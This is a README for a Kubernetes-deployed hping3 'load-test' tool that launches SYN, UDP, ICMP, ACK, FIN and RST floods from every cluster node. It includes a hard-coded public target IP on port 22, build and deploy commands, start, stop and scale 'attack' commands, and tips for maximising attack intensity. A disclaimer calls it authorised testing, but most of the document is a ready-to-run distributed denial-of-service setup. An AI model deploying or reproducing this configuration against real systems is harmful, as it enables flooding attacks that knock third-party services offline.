# Python Hping3 Load-Test Documentation

A Kubernetes-ready containerized load testing tool using hping3 for high-intensity network testing.

## 🚀 Quick Start

### 1. Build and Push Docker Image
```bash
docker build -f hping.dockerfile -t yourusername/hping-python:latest .
docker push yourusername/hping-python:latest
```

### 2. Deploy to Kubernetes
```bash
kubectl create configmap hping-script --from-file=hping_script.py
kubectl apply -f hping.yaml
```

## ⚙️ Configuration

### Target Configuration
Edit the ConfigMap in `hping.yaml` or modify `hping_script.py`:

```python
TARGET_IP = "202.58.172.237"     # Change to your target IP
TARGET_PORT = 22                 # Change to target port
DURATION = 300                   # Attack duration in seconds
THREADS = 8                      # Number of concurrent hping processes
PACKET_SIZE = 8192              # Packet size in bytes
```

### Attack Types
Change the attack type in `hping_script.py`:
```python
attack_type = "syn_flood"  # Options: syn_flood, udp_flood, icmp_flood, 
                          #          ack_flood, fin_flood, rst_flood
```

### Scaling
Adjust the number of attack nodes by modifying the DaemonSet or converting to Deployment:

**DaemonSet (current):** Runs one pod per Kubernetes node
```yaml
kind: DaemonSet  # Runs on every node automatically
```

**Deployment (alternative):** Control exact number of replicas
```yaml
kind: Deployment
spec:
  replicas: 5  # Run exactly 5 pods
```

## 🎯 Available Attack Types

| Attack Type | Description | hping3 Flags |
|-------------|-------------|--------------|
| `syn_flood` | TCP SYN flood | `-S --flood` |
| `udp_flood` | UDP flood | `-2 --flood` |
| `icmp_flood` | ICMP ping flood | `-1 --flood` |
| `ack_flood` | TCP ACK flood | `-A --flood` |
| `fin_flood` | TCP FIN flood | `-F --flood` |
| `rst_flood` | TCP RST flood | `-R --flood` |

## 🔧 Updating Configuration

### Method 1: Update ConfigMap (Recommended)
```bash
# Edit the script in hping.yaml
nano hping.yaml

# Apply changes
kubectl apply -f hping.yaml

# Restart pods to pick up changes
kubectl rollout restart daemonset/hping-daemonset
```

### Method 2: Direct ConfigMap Edit
```bash
kubectl edit configmap hping-script
kubectl rollout restart daemonset/hping-daemonset
```

## 📋 Management Commands

### Start Attack
```bash
kubectl apply -f hping.yaml
```

### Stop Attack
```bash
kubectl delete -f hping.yaml
```

### Scale Attack
```bash
# Temporarily stop all pods
kubectl scale daemonset hping-daemonset --replicas=0

# Resume attack
kubectl scale daemonset hping-daemonset --replicas=1
```

### View Attack Status
```bash
# Pod status
kubectl get pods -l app=hping-load-test -o wide

# Resource usage
kubectl top pods -l app=hping-load-test

# Detailed pod info
kubectl describe pods -l app=hping-load-test
```

## 📁 Files Structure

- `hping_script.py` - Main Python load test script
- `hping.dockerfile` - Docker image with hping3 and Python
- `hping.yaml` - Kubernetes deployment with ConfigMap
- `README.md` - This documentation

## 🛠️ Requirements

- Kubernetes cluster with nodes
- Privileged containers enabled (for raw socket access)
- Network policies allowing outbound traffic
- Sufficient CPU/memory resources on nodes

## 📊 Performance Tips

### Maximize Attack Intensity
```python
THREADS = 16           # Increase concurrent processes
PACKET_SIZE = 65500    # Use maximum packet size
DURATION = 3600        # Longer attack duration
```

### Resource Optimization - if needed ;) -
```yaml
resources:
  limits:
    memory: "2Gi"      # Increase memory limit
    cpu: "4"           # Increase CPU limit
```

## 🚨 Legal Disclaimer

This tool is for **authorized security testing only**. Users are responsible for:
- Obtaining proper authorization before testing
- Complying with local laws and regulations  
- Using the tool ethically and responsibly

**Unauthorized use of this tool may be illegal and could result in criminal charges.**

## 📝 License

Use at your own risk. This tool is provided as-is for educational and authorized testing purposes only.